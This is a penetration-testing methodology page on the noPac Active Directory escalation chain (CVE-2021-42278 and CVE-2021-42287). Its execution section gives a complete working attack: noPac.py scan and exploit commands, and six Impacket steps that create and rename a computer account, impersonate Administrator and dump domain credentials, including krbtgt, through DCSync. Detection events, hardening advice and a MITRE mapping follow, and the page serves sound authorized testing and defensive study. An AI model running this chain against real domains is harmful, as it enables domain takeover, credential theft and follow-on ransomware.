> **English** | [Italiano](README.md)

# noPac: from domain user to Domain Admin (CVE-2021-42278 + CVE-2021-42287)

> - **Phase:** Privilege Escalation in the domain - exploitation of two CVEs in the Kerberos/KDC flow
> - **Visibility:** Medium - the chain creates and renames a computer account (logged events) and generates anomalous Kerberos requests; it is noisy if the DC is monitored
> - **Prerequisites:** valid domain user credentials; `MachineAccountQuota > 0` (or a computer account already controlled); an **unpatched** Domain Controller (November 2021 patch absent)
> - **Technique:** `noPac` | **Typical severity:** `Critical` | **Finding ID:** to assign in lab (methodology)

- Nature of the document: methodology + complete working chain (Impacket and noPac.py). Example values on a lab domain (`corp.local`/`DC01`); hashes redacted. To be run only in an owned lab or with authorization.
- Objective: understand how two combined vulnerabilities allow any domain user to impersonate a Domain Controller and reach DCSync, and how to detect and prevent them.

---

## Executive Summary

noPac is one of the fastest, highest-impact privilege escalation chains in unpatched Active Directory. It
combines two November 2021 vulnerabilities:

- **CVE-2021-42278 (sAMAccountName spoofing):** AD does not correctly validate that a computer account has a name
  ending in `$`. An attacker can rename a computer account under their control so that it matches the name of a
  Domain Controller (without the `$`).
- **CVE-2021-42287 (KDC confusion):** when the KDC does not find the indicated principal (because the account has
  since been renamed), it performs a fallback by appending `$` and ends up resolving it to the real Domain
  Controller account, issuing tickets as if the attacker were the DC.

The combined effect is: **DC impersonation, then [DCSync](<../../05-credential-dumping/dcsync/README.en.md>),
up to domain compromise**. The typical chain in assessments combines password spraying, noPac and DCSync: it
turns a low-privilege access into domain control in very little time. Severity `Critical`.

## Operational context (why, before how)

noPac is attempted as soon as valid domain credentials are obtained, because the impact/effort ratio is very
high: if the prerequisites are present, no long chain of ACL or delegation abuse is needed. The operational
decision is the **preliminary check** (scan) before any invasive action: you must confirm the DC's patch status
and the value of `MachineAccountQuota` (if > 0, a standard user can create a computer account, making the chain
immediate; if = 0, an already-controlled computer account is required). From the assessment standpoint, the value
lies in documenting whether the domain is vulnerable and with which prerequisites, not in "launching the
exploit".

## Execution / Commands

### Preliminary check (non-invasive)

Check of `MachineAccountQuota` (how many computer accounts a standard user can create):

```bash
# Check of MachineAccountQuota via NetExec (maq module)
netexec ldap <DC_IP> -u <user> -p '<PLACEHOLDER>' -M maq
```

Illustrative output (representative):

```
MAQ         MachineAccountQuota: 10    <-- > 0: a standard user can create computer accounts
```

Many tools (e.g., `noPac.py`) offer a `--scan` mode that assesses whether the target is vulnerable without
performing the invasive part: it is the correct step to document first.

### Automated exploit with noPac.py

The `noPac.py` tool (sam-the-admin) encapsulates the whole chain. First the scan, then, if vulnerable, the
impersonation with a DCSync dump:

```bash
# Scan: assess exploitability with no invasive action
python3 noPac.py corp.local/user:'Password123' -dc-ip 10.0.0.10 -dc-host DC01 --scan

# Exploit: impersonate Administrator and run secretsdump (DCSync) in one shot
python3 noPac.py corp.local/user:'Password123' -dc-ip 10.0.0.10 -dc-host DC01 \
  --impersonate Administrator -dump
```

Illustrative output (hashes redacted):

```
[*] Got TGT for DC01$  (sAMAccountName spoofing succeeded)
[*] Impersonating Administrator via S4U
Administrator:500:aad3b435...:3f1c2d...:::    <-- domain administrator NTLM hash (redacted)
krbtgt:502:aad3b435...:9a7f6e...:::           <-- krbtgt hash (enables Golden/Diamond Ticket)
```

### Manual chain with Impacket (to understand it and for troubleshooting)

```bash
# 1. Create a computer account (requires MachineAccountQuota > 0)
impacket-addcomputer corp.local/user:'Password123' -dc-ip 10.0.0.10 \
  -computer-name 'NOPAC$' -computer-pass 'Comp1234!'

# 2. Rename the computer account to match the DC's sAMAccountName, WITHOUT the '$' (CVE-2021-42278)
impacket-renameMachine corp.local/user:'Password123' -dc-ip 10.0.0.10 \
  -current-name 'NOPAC$' -new-name 'DC01'

# 3. Request a TGT for the renamed account
impacket-getTGT corp.local/'DC01':'Comp1234!' -dc-ip 10.0.0.10
export KRB5CCNAME=DC01.ccache

# 4. Restore the computer account's original name (the TGT keeps the reference to the DC)
impacket-renameMachine corp.local/user:'Password123' -dc-ip 10.0.0.10 \
  -current-name 'DC01' -new-name 'NOPAC$'

# 5. Request a service ticket via S4U2self: the KDC, not finding 'DC01', falls back to 'DC01$' (CVE-2021-42287)
#    and issues a ticket in the real DC context, impersonating Administrator
impacket-getST -self -impersonate Administrator -altservice 'cifs/DC01.corp.local' \
  -k -no-pass 'corp.local/DC01'
export KRB5CCNAME=Administrator.ccache

# 6. Use the ticket for DCSync: dump domain credentials (including krbtgt)
impacket-secretsdump -k -no-pass -dc-ip 10.0.0.10 'corp.local/Administrator@DC01.corp.local' -just-dc
```

> The exact flags (`-self`/`-altservice`, ccache names) can vary with the Impacket version; verify in the lab
> with `-debug`. Obtained credentials must be treated as sensitive data and redacted in the report.
Step 6 ([DCSync](<../../05-credential-dumping/dcsync/README.en.md>)) hands over the entire domain.

## Analysis of results

If the chain succeeds, the impact is maximal (`Critical`): from domain user to full control via DCSync. If the DC
is patched, the chain breaks (the KDC fallback is no longer exploitable and sAMAccountName spoofing is blocked).
If `MachineAccountQuota = 0` and you do not already control a computer account, the first step is not executable.
Documenting which of the prerequisites is missing is part of the assessment's value: it indicates exactly which
control is protecting the domain.

### Theoretical Analysis

noPac is a flaw of **consistency between identity and authorization** in the Kerberos flow. CVE-2021-42278 breaks
the assumption that a computer account name is unique and ends in `$`; CVE-2021-42287 introduces a KDC fallback
that, in the presence of that breakage, resolves the wrong principal. Neither alone would be devastating: it is
their combination that makes the KDC issue, in good faith, tickets with a Domain Controller's authorization. It
is an example of how two "minor" validation flaws compose a critical escalation. The countermeasure is
structural: patching restores the missing validations; hardening (`MachineAccountQuota = 0`, restriction on
computer-account creation) reduces the surface upstream.

## Remediation (Blue Team)

**Detection.**
- Event ID **4741** (computer account creation) by non-administrative users.
- Event ID **4742** / **4781** (computer account modification/rename), especially toward a name that matches a DC
  or the removal of the `$`.
- Anomalous Kerberos requests on machine principals; unexpected S4U.
- Correlation: computer account creation, then rename, then ticket request, in rapid succession by the same
  actor.

**Hardening.**
- **Patching** of the Domain Controllers (November 2021 patch: the KBs that fix CVE-2021-42278/42287) - the
  primary countermeasure.
- Set `MachineAccountQuota = 0` and delegate computer-account creation only to those who need it.
- Restrict via ACL who can create computer objects in the domain.
- Serious logging and alerting on computer-account creation/rename.

---

## Real-World Scenario: Post-Exploitation Projection

> Applies to a successful exploitation on an unpatched DC (severity Critical).

### Attacker Perspective (Red Team)

**Starting point:** the credentials of a low-privilege domain user (e.g., from password spraying).

**Immediate next step:** verify prerequisites (patch, `MachineAccountQuota`) and, if vulnerable, run the chain up
to DCSync.

**Projected Kill Chain:**

```
Standard user credentials (e.g., from password spraying)
        |
        v
noPac: Domain Controller impersonation (CVE-2021-42278 + 42287)
        |
        v
DCSync -> dump of domain hashes (including krbtgt)
        |
        v
Golden/Diamond Ticket, domain-wide persistence, access to any system
```

**Potential impact:** from least privilege to total domain control in a few steps. Once the `krbtgt` hash is
obtained, persistence can become long-term (see Golden/Diamond/Sapphire).

**Typical monetization vectors:** domain-wide ransomware, massive exfiltration, persistence.

### Defender Perspective (Blue Team)

**Detection:** events 4741/4742/4781 by non-administrative actors; creation-rename-ticket sequence; Kerberos
anomalies on machine principals.

**Indicators of Compromise (IOC):** a computer account with a name matching a DC or lacking `$`; computer account
creation followed by privileged Kerberos activity; DCSync from a non-DC host.

**Containment:** immediate patching of the DCs; `MachineAccountQuota = 0`; if krbtgt is compromised, a double
reset; investigation of recent accesses and computer accounts.

**Eradication and hardening:** patch, MAQ to zero, ACL restriction on computer-account creation, robust logging,
DCSync monitoring (replication from unauthorized hosts).

**Defensive lesson:** noPac shows that two seemingly minor validation flaws, if unpatched, compose one of the
most critical escalations; patching the DCs is not optional, and `MachineAccountQuota = 0` is a near-zero-cost
hardening with great return.

---

## Reference tools

| Tool | Type | Technique/Access | Main use case |
| :--- | :--- | :--- | :--- |
| `noPac.py` (sam-the-admin) | AD exploit | CLI - Active | Verification (`--scan`) and, in an authorized lab, the automated noPac chain |
| `Impacket` (addcomputer, renameMachine, getTGT, getST, secretsdump) | AD toolkit | CLI - Active | Manual execution of the individual steps (understanding and troubleshooting) |
| `NetExec` (`maq` module) | AD recon | CLI - Active | Check of `MachineAccountQuota` and of the domain state |

## Methodology notes

In a real lab (e.g., GOAD or an HTB machine with an unpatched DC) document: the DC's patch status, the
`MachineAccountQuota` value, the scan outcome and, if run in an authorized context, the evidence of impact. Any
obtained credentials must be treated as sensitive data and redacted in the report. The document's focus remains
on exploitability, detection and remediation, not on reproducing the exploit.

## MITRE ATT&CK mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Privilege Escalation | Exploitation for Privilege Escalation | `T1068` | Combined exploitation of CVE-2021-42278 and CVE-2021-42287 to impersonate a DC. |
| Persistence | Create Account: Domain Account | `T1136.002` | Creation of a computer account as the initial step of the chain. |
| Credential Access | OS Credential Dumping: DCSync | `T1003.006` | Dump of domain credentials via the ticket in the DC context. |

## Links to other modules

| Source | This technique | Effect |
| :--- | :--- | :--- |
| [Password spraying](<../../../07-post-exploitation/README.en.md>) / initial credentials | noPac | provides the domain user from which the chain starts |
| noPac | [DCSync](<../../05-credential-dumping/dcsync/README.en.md>) | the obtained ticket enables the dump of domain credentials |
| noPac (krbtgt hash) | [Golden](<../../02-kerberos-attacks/golden-ticket/README.en.md>) / [Diamond](<../../02-kerberos-attacks/diamond-ticket/README.en.md>) | the obtained krbtgt key enables domain-wide persistence |

---

> **Note:** Educational content. The chain is functional and must be run only in owned labs (e.g., GOAD) or with explicit authorization. Example values on a lab domain; outputs and hashes are illustrative/redacted, not from real systems.
